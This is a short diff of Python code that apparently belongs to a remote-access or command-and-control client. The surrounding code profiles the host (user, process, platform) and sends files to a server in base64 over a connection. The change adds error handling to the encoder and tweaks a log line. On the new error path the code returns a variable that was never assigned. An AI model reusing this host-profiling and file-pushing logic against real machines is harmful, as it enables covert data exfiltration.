@@ -177,9 +177,14 @@ node: {}""".format(getpid(),getlogin(),date_time,platform.system(),platform.rele
     return sys_info
 
 def base64_encode(message):
-    message_bytes = message.encode('ascii')
-    base64_bytes = base64.b64encode(message_bytes)
-    base64_message = base64_bytes.decode('ascii')
+    try:
+        message_bytes = message.encode('ascii')
+        base64_bytes = base64.b64encode(message_bytes)
+        base64_message = base64_bytes.decode('ascii')
+    except Exception as e:
+        if VERBOSE:
+            print(e)
+            print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
     return base64_message
 
 def send_data(conn, plain_text):
@@ -205,7 +210,7 @@ def file_transfer_get(conn, file_name):      #push to server - response from a '
         if VERBOSE:
             print_fail("IO Error, Unable to Read File for Transfer")
     if VERBOSE:
-        print_info("Sending File:\n" + file_name)
+        print_info("Sending File: " + file_name)
     while data:
         b64_data = base64_encode(data)
         if DEBUG:
